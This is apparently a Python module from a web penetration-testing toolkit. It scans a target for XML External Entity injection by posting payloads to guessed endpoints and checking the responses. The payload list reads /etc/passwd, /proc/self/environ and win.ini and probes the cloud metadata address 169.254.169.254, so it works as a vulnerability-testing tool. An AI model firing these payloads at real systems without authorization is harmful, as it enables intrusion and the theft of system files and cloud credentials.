#!/usr/bin/env python3
"""
XXE (XML External Entity) Scanner
Tests for classic file read, SSRF via XXE, parameter entity, error-based XXE.
"""

import re
import requests
import concurrent.futures
from bs4 import BeautifulSoup
from pathlib import Path
from urllib.parse import urljoin, urlparse
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

ALL_XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><data>&xxe;</data></root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root><data>&xxe;</data></root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root><data>&xxe;</data></root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root><data>&xxe;</data></root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root><data>&xxe;</data></root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/">]><root><data>&xxe;</data></root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><root><data>&xxe;</data></root>',
]

XXE_INDICATORS = [
    "root:x:0:0",
    "daemon:x:",
    "nobody:x:",
    "/bin/bash",
    "/bin/sh",
    "[extensions]",
    "for 16-bit app support",
    "[fonts]",
    "ami-id",
    "instance-id",
    "local-ipv4",
    "HTTP_HOST=",
    "DOCUMENT_ROOT=",
    "failed to open stream",
    "java.io.FileNotFoundException",
]

XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/xhtml+xml",
]

COMMON_XML_PATHS = [
    "/api/",
    "/api/v1/",
    "/api/v2/",
    "/soap/",
    "/wsdl/",
    "/ws/",
    "/xmlrpc.php",
    "/upload/",
    "/import/",
    "/feed/",
    "/rss/",
]


class XXEScanner:
    """XML External Entity injection scanner."""

    PAYLOAD_FILE = Path(__file__).parents[2] / "wordlists" / "payloads" / "xxe.txt"

    def __init__(self, target: str, threads: int = 5, timeout: int = 12, session=None):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        if session is not None:
            self.session = session
        else:
            self.session = requests.Session()
            self.session.headers["User-Agent"] = (
                "WebPwnToolkit/2.0 (Authorized Security Testing)"
            )
            self.session.verify = False
        self.results: List[Dict] = []

    def _load_payloads(self) -> List[str]:
        if self.PAYLOAD_FILE.exists():
            with open(self.PAYLOAD_FILE, encoding="utf-8") as f:
                extra = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            return list(dict.fromkeys(ALL_XXE_PAYLOADS + extra))
        return ALL_XXE_PAYLOADS

    def _detect_xxe(self, body: str) -> Optional[str]:
        for indicator in XXE_INDICATORS:
            if indicator in body:
                return indicator
        return None

    def _find_xml_endpoints(self) -> List[Dict]:
        endpoints = []
        try:
            resp = self.session.get(self.target, timeout=self.timeout, verify=False)
            soup = BeautifulSoup(resp.text, "lxml")
            for form in soup.find_all("form", method=re.compile("post", re.I)):
                action = urljoin(self.target, form.get("action", ""))
                for ct in XML_CONTENT_TYPES:
                    endpoints.append({"url": action or self.target, "content_type": ct})
        except Exception:
            pass

        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path in COMMON_XML_PATHS:
            for ct in XML_CONTENT_TYPES:
                endpoints.append({"url": base + path, "content_type": ct})

        # Always try the target itself
        for ct in XML_CONTENT_TYPES:
            endpoints.append({"url": self.target, "content_type": ct})

        return endpoints

    def _test_payload(self, endpoint: Dict, payload: str) -> Optional[Dict]:
        url = endpoint["url"]
        ct = endpoint.get("content_type", "application/xml")
        try:
            resp = self.session.post(
                url,
                data=payload.encode("utf-8"),
                headers={
                    "Content-Type": ct,
                    "Accept": "application/xml, text/xml, */*",
                },
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
            indicator = self._detect_xxe(resp.text)
            if indicator:
                confidence = (
                    "high"
                    if any(
                        k in indicator
                        for k in [
                            "root:x:",
                            "daemon:x:",
                            "[extensions]",
                        ]
                    )
                    else "medium"
                )
                return {
                    "url": url,
                    "method": "POST",
                    "content_type": ct,
                    "payload": payload[:200],
                    "type": "XML External Entity (XXE)",
                    "severity": "critical",
                    "confidence": confidence,
                    "evidence": indicator[:100],
                    "detail": (
                        f"XXE confirmed — server processed external entity "
                        f"(indicator: '{indicator}'). Endpoint: {url}"
                    ),
                    "owasp": "A05:2021 – Security Misconfiguration",
                    "cvss": 9.1,
                    "remediation": (
                        "Disable XML external entity processing in your XML parser. "
                        "In Python use defusedxml. In Java: setFeature('disallow-doctype-decl', true). "
                        "Validate and sanitize all XML input."
                    ),
                }
        except Exception:
            pass
        return None

    def run(self) -> List[Dict]:
        payloads = self._load_payloads()
        endpoints = self._find_xml_endpoints()
        console.print(
            f"  [dim]-> {len(payloads)} XXE payloads | {len(endpoints)} endpoint(s)[/dim]"
        )

        all_tests = [(ep, pl) for ep in endpoints for pl in payloads]

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]XXE scanning...[/cyan]"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=console,
        ) as progress:
            task = progress.add_task("xxe", total=len(all_tests))
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
                futures = {
                    ex.submit(self._test_payload, ep, pl): (ep, pl)
                    for ep, pl in all_tests
                }
                for future in concurrent.futures.as_completed(futures):
                    progress.advance(task)
                    result = future.result()
                    if result and result not in self.results:
                        self.results.append(result)

        console.print(
            f"  [{'red' if self.results else 'green'}]"
            f"{'⚠ ' + str(len(self.results)) + ' XXE vulnerability(ies) found!' if self.results else '✅ No XXE found'}"
            f"[/]"
        )
        return self.results
